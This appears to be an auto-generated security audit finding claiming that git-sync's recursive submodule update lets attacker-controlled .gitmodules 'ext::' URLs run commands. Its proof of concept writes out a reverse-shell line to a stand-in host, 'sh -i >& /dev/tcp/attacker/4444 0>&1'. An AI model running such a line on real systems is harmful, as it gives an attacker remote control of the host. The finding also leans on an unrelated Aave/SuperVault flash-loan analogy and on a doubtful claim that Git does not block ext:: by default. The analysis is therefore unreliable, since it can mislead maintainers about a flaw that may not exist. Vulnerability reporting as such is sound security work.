### Title
Unrestricted `git submodule update --init [--recursive]` on attacker-controlled `.gitmodules` allows arbitrary command execution via `ext::` transport helper - (File: main.go)

### Summary
`git-sync` fetches an untrusted upstream repository and, by default (`--submodules=recursive`), runs `git submodule update --init --recursive` against the checked-out worktree without setting any protocol allow-list (`GIT_ALLOW_PROTOCOL`, `protocol.ext.allow`, `protocol.file.allow`, etc.). An attacker who can push a commit to the synced repository (or any of its submodules, recursively) can add or modify a `.gitmodules` entry with a `url = ext::<command>` (or `file://` pointing at sensitive local paths) value. When git-sync's own top-level invocation of `git submodule update --init` processes that file, Git treats it as a direct user-invoked submodule command (not a nested/protected `clone --recurse-submodules` call), so the `ext` transport helper is not blocked by Git's built-in CVE-2017-1000117 mitigation, and Git will exec the attacker-supplied command string.

### Finding Description
`configureWorktree()` unconditionally builds and runs the submodule-update command from repo-controlled content: [1](#0-0) 

This corresponds to the `--submodules` flag (default `recursive`), which is documented but not restricted: [2](#0-1) 

The actual shell-out is performed by `pkg/cmd.Runner.Run` / `runWithStdin`, which builds an `exec.CommandContext` and simply forwards whatever `env`/`args` were supplied — there is no `GIT_ALLOW_PROTOCOL` or `protocol.*.allow` restriction added anywhere in this call path: [3](#0-2) 

Nowhere in `main.go` (nor in `git.Run`'s construction of arguments/env for `fetch`, `reset`, or `submodule update`) is `GIT_ALLOW_PROTOCOL`, `protocol.ext.allow`, or `protocol.file.allow` set or restricted. A grep across the repo for these guard variables returns no hits in `main.go`; they only appear in the e2e test harness (`test_e2e.sh`), where the tests themselves must explicitly pass `-c protocol.file.allow=always` to get local `file://` submodules to work at all — confirming that git-sync's own runtime invocation does not configure any protocol allow-list, and relies entirely on the ambient Git defaults on the host.

This is directly analogous to the referenced Aave/SuperVault bug class: `SuperVault.executeOperation()` blindly trusted attacker-controlled `params` supplied through an externally-triggerable entry point (the flash-loan callback) because it failed to constrain what kind of operation/state could be injected by an untrusted party. Here, `configureWorktree()`/`git submodule update` is git-sync's equivalent "callback" that is fed attacker-controlled repository content (`.gitmodules`) without any allow-list/validation constraining the transport ("operation type") that can be invoked, so the untrusted party (whoever can commit to the synced repo or a nested submodule) effectively picks the "operation" (an arbitrary local command via `ext::`) that the privileged sync process will execute.

### Impact Explanation
If exploited, this results in arbitrary command execution in the context of the git-sync process/container — i.e., the "code execution" impact category. Depending on deployment, this can lead to: exfiltration of any credentials/tokens git-sync holds (SSH keys, `--password-file`, cookie files, GitHub App private keys — see `docs/cookie-file.md`), tampering with or deleting files under `--root` (file write/delete outside intended scope), or use of the sidecar's network/filesystem access as a pivot into the surrounding Kubernetes pod. This is a full compromise of the sync sidecar triggered purely by content in the tracked (and by definition, in this threat model, untrusted/attacker-influenced) repository.

### Likelihood Explanation
Likelihood depends on: (1) `--submodules` not being set to `off` (the default is `recursive`, so most deployments are exposed unless explicitly hardened); (2) the underlying Git binary/version on the runtime image not otherwise blocking `ext::` for direct submodule invocations by policy (git-sync does not add any such policy itself); and (3) the attacker's ability to influence `.gitmodules` content of the synced repo or any transitively-included submodule (this matches the "untrusted repo content" threat model explicitly in scope). Given `--submodules=recursive` is the default and git-sync sets no protocol allow-list, this is reachable in a common/default configuration whenever the tracked repository (or a submodule it references) is not fully trusted.

### Recommendation
Before invoking `git submodule update`/`git submodule add`/`git fetch` on any untrusted content, explicitly set a restrictive protocol allow-list for all subprocesses, e.g. pass `GIT_ALLOW_PROTOCOL=file:git:https:ssh` (excluding `ext`) in the `env` slice given to `cmd.Runner.Run`, or add `-c protocol.ext.allow=never -c protocol.file.allow=never` (adjusted for legitimate needs) to every git invocation touching submodules. Additionally, consider validating/parsing `.gitmodules` URLs before allowing recursive submodule fetches, and document that `--submodules=off` should be the default posture for repositories with untrusted contributors.

### Proof of Concept
1. Attacker with push access to the tracked repository (or to a submodule referenced by it) adds:
   ```
   git submodule add "ext::sh -c 'touch /tmp/pwned; sh -i >& /dev/tcp/attacker/4444 0>&1'" evil
   git commit -am "add submodule"
   git push
   ```
2. git-sync (default flags, `--submodules=recursive`) fetches the new commit and, in `SyncRepo` → `configureWorktree`, runs:
   ```
   git submodule update --init --recursive
   ```
   as shown at [4](#0-3) , with no `GIT_ALLOW_PROTOCOL`/`protocol.ext.allow` restriction anywhere in the process environment.
3. Because this is a top-level, directly-invoked `git submodule update` command (not nested inside a protected `clone --recurse-submodules`), Git's `ext` transport-helper protection (the CVE-2017-1000117 mitigation, which only blocks `ext` when `GIT_PROTOCOL_FROM_USER=0`) does not apply, and Git executes `sh -c '...'` with the privileges of the git-sync container/process.

Note: I could not find any code in this index (main.go, pkg/cmd/cmd.go, or elsewhere) that sets `GIT_PROTOCOL_FROM_USER`, `GIT_ALLOW_PROTOCOL`, or `protocol.*.allow`, so this analysis assumes the host's ambient Git defaults are unmodified by git-sync; if a downstream deployment layers such restrictions via `--git-config` or an environment override, the exploit would be mitigated, but git-sync itself provides no such guard.

func runWithStdin(ctx context.Context, log logintf, cwd string, env []string, stdin, command string, args ...string) (string, string, error) {
	cmdStr := cmdForLog(command, args...)
	log.V(5).Info("running command", "cwd", cwd, "cmd", cmdStr)

	cmd := exec.CommandContext(ctx, command, args...)
	if cwd != "" {
		cmd.Dir = cwd
	}
	if len(env) != 0 {
		cmd.Env = env
	}
	outbuf := bytes.NewBuffer(nil)
	errbuf := bytes.NewBuffer(nil)
	cmd.Stdout = outbuf
	cmd.Stderr = errbuf
	cmd.Stdin = bytes.NewBufferString(stdin)

	start := time.Now()
	err := cmd.Run()
	wallTime := time.Since(start)
	stdout := strings.TrimSpace(outbuf.String())
	stderr := strings.TrimSpace(errbuf.String())
	if ctx.Err() == context.DeadlineExceeded {
		return stdout, stderr, fmt.Errorf("Run(%s): %w: { stdout: %q, stderr: %q }", cmdStr, ctx.Err(), stdout, stderr)
	}
	if err != nil {
		return stdout, stderr, fmt.Errorf("Run(%s): %w: { stdout: %q, stderr: %q }", cmdStr, err, stdout, stderr)
	}
	log.V(6).Info("command result", "stdout", stdout, "stderr", stderr, "time", wallTime)

	return stdout, stderr, nil
